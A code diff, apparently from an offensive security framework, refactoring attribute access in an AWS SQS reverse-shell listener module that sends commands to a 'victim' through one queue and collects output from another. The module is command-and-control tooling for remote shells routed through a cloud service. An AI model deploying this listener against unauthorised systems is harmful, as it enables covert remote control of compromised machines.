@@ -71,15 +71,15 @@ class Module(Listener):
         try:
             # Prepare client configuration
             client_config = {
-                'region_name': str(self.aws_region.value)
+                'region_name': str(self.aws_region)
             }
             
             # Use credentials if provided, otherwise use default credentials
-            if self.aws_access_key_id.value and self.aws_secret_access_key.value:
-                client_config['aws_access_key_id'] = str(self.aws_access_key_id.value)
-                client_config['aws_secret_access_key'] = str(self.aws_secret_access_key.value)
-                if self.aws_session_token.value:
-                    client_config['aws_session_token'] = str(self.aws_session_token.value)
+            if self.aws_access_key_id and self.aws_secret_access_key:
+                client_config['aws_access_key_id'] = str(self.aws_access_key_id)
+                client_config['aws_secret_access_key'] = str(self.aws_secret_access_key)
+                if self.aws_session_token:
+                    client_config['aws_session_token'] = str(self.aws_session_token)
             
             # Create SQS client
             self.sqs_client = boto3.client('sqs', **client_config)
@@ -87,7 +87,7 @@ class Module(Listener):
             # Test connection by getting queue attributes
             try:
                 self.sqs_client.get_queue_attributes(
-                    QueueUrl=str(self.command_queue_url.value),
+                    QueueUrl=str(self.command_queue_url),
                     AttributeNames=['QueueArn']
                 )
                 print_success("AWS SQS client initialized successfully")
@@ -95,7 +95,7 @@ class Module(Listener):
             except ClientError as e:
                 error_code = e.response.get('Error', {}).get('Code', 'Unknown')
                 if error_code == 'AWS.SimpleQueueService.NonExistentQueue':
-                    print_error(f"Command queue not found: {self.command_queue_url.value}")
+                    print_error(f"Command queue not found: {self.command_queue_url}")
                 else:
                     print_error(f"AWS error: {e}")
                 return False
@@ -108,7 +108,7 @@ class Module(Listener):
         """Run the AWS SQS listener"""
         try:
             # Validate configuration
-            if not self.command_queue_url.value or not self.response_queue_url.value:
+            if not self.command_queue_url or not self.response_queue_url:
                 print_error("Both command_queue_url and response_queue_url must be set")
                 return False
             
@@ -117,37 +117,37 @@ class Module(Listener):
                 return False
             
             print_status("Starting AWS SQS reverse shell listener...")
-            print_info(f"Command Queue: {self.command_queue_url.value}")
-            print_info(f"Response Queue: {self.response_queue_url.value}")
-            print_info(f"Region: {self.aws_region.value}")
-            print_info(f"Poll Interval: {self.poll_interval.value}s")
+            print_info(f"Command Queue: {self.command_queue_url}")
+            print_info(f"Response Queue: {self.response_queue_url}")
+            print_info(f"Region: {self.aws_region}")
+            print_info(f"Poll Interval: {self.poll_interval}s")
             print_info("Waiting for victim to connect...")
             
             # Create a connection object (dictionary with AWS SQS info)
             connection_data = {
                 'sqs_client': self.sqs_client,
-                'command_queue_url': str(self.command_queue_url.value),
-                'response_queue_url': str(self.response_queue_url.value),
-                'region': str(self.aws_region.value),
-                'poll_interval': int(self.poll_interval.value),
-                'visibility_timeout': int(self.visibility_timeout.value),
-                'max_messages': int(self.max_messages.value),
-                'use_base64': bool(self.use_base64.value),
-                'message_attributes': bool(self.message_attributes.value),
+                'command_queue_url': str(self.command_queue_url),
+                'response_queue_url': str(self.response_queue_url),
+                'region': str(self.aws_region),
+                'poll_interval': int(self.poll_interval),
+                'visibility_timeout': int(self.visibility_timeout),
+                'max_messages': int(self.max_messages),
+                'use_base64': bool(self.use_base64),
+                'message_attributes': bool(self.message_attributes),
                 'listener_id': self.listener_id
             }
             
             # Create session with connection data
             # Use a dummy host/port since we're using AWS SQS
-            target = f"aws-sqs-{self.aws_region.value}"
+            target = f"aws-sqs-{self.aws_region}"
             port = 0  # No port for SQS
             
             # Prepare session data
             session_data = {
                 'protocol': 'aws_sqs',
-                'aws_region': str(self.aws_region.value),
-                'command_queue_url': str(self.command_queue_url.value),
-                'response_queue_url': str(self.response_queue_url.value),
+                'aws_region': str(self.aws_region),
+                'command_queue_url': str(self.command_queue_url),
+                'response_queue_url': str(self.response_queue_url),
                 'connection_type': 'aws_sqs',
                 'connection_time': time.time(),
                 'listener_type': 'reverse_aws_sqs',
@@ -200,11 +200,11 @@ class Module(Listener):
                 try:
                     # Receive messages from response queue
                     response = self.sqs_client.receive_message(
-                        QueueUrl=str(self.response_queue_url.value),
-                        MaxNumberOfMessages=min(int(self.max_messages.value), 10),
+                        QueueUrl=str(self.response_queue_url),
+                        MaxNumberOfMessages=min(int(self.max_messages), 10),
                         WaitTimeSeconds=1,  # Short polling
-                        VisibilityTimeout=int(self.visibility_timeout.value),
-                        MessageAttributeNames=['All'] if self.message_attributes.value else []
+                        VisibilityTimeout=int(self.visibility_timeout),
+                        MessageAttributeNames=['All'] if self.message_attributes else []
                     )
                     
                     messages = response.get('Messages', [])
@@ -217,7 +217,7 @@ class Module(Listener):
                                 receipt_handle = message.get('ReceiptHandle')
                                 
                                 # Decode if base64
-                                if self.use_base64.value:
+                                if self.use_base64:
                                     try:
                                         body = base64.b64decode(body).decode('utf-8')
                                     except:
@@ -251,7 +251,7 @@ class Module(Listener):
                                 # Delete message after processing
                                 if receipt_handle:
                                     self.sqs_client.delete_message(
-                                        QueueUrl=str(self.response_queue_url.value),
+                                        QueueUrl=str(self.response_queue_url),
                                         ReceiptHandle=receipt_handle
                                     )
                                 
@@ -266,7 +266,7 @@ class Module(Listener):
                                 continue
                     
                     # Sleep before next poll
-                    time.sleep(int(self.poll_interval.value))
+                    time.sleep(int(self.poll_interval))
                     
                 except ClientError as e:
                     error_code = e.response.get('Error', {}).get('Code', 'Unknown')
@@ -311,12 +311,12 @@ class Module(Listener):
             message_body = json.dumps(message_data)
             
             # Encode if base64
-            if self.use_base64.value:
+            if self.use_base64:
                 message_body = base64.b64encode(message_body.encode('utf-8')).decode('utf-8')
             
             # Prepare message attributes if enabled
             message_attributes = {}
-            if self.message_attributes.value:
+            if self.message_attributes:
                 message_attributes = {
                     'CommandID': {
                         'StringValue': command_id,
@@ -330,7 +330,7 @@ class Module(Listener):
             
             # Send message
             response = self.sqs_client.send_message(
-                QueueUrl=str(self.command_queue_url.value),
+                QueueUrl=str(self.command_queue_url),
                 MessageBody=message_body,
                 MessageAttributes=message_attributes if message_attributes else None
             )
